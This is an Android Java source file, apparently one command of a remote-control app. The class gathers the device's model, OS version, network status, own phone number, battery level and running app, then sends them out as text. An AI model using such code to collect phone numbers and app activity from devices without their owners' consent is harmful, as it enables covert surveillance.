package com.lfish.control.action.actiondomian;

import android.os.Build;

import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.Utils;
import com.lfish.control.action.actiontool.WifiUtils;
import com.lfish.control.utils.BatteryUtils;
import com.lfish.control.utils.PhoneUtils;

public class GetDeviceMsgAction extends BaseBeanAction {

	public GetDeviceMsgAction() {
		super();
		// TODO Auto-generated constructor stub
	}

	@Override
	public void run() {
//		Device.self();
		StringBuffer bf = new StringBuffer();
		bf.append("型号:"+Build.PRODUCT +"-" +Build.MANUFACTURER);
		bf.append("\r\n");
		bf.append("系统:android "+android.os.Build.VERSION.RELEASE);
		bf.append("\r\n");
		bf.append("网络:"+ WifiUtils.GetNetStatus(ControlApplication.context));
		bf.append("\r\n");
		bf.append("电话:"+ PhoneUtils.getNativePhoneNumber(ControlApplication.context));
		bf.append("\r\n");
		bf.append("电量:"+ BatteryUtils.getInstance().getCurrentBattery());
		bf.append("\r\n");
		bf.append("运行:"+ Utils.getCurreentRuningAppInfo(ControlApplication.context));
		sendTxt(bf.toString());
	}
}
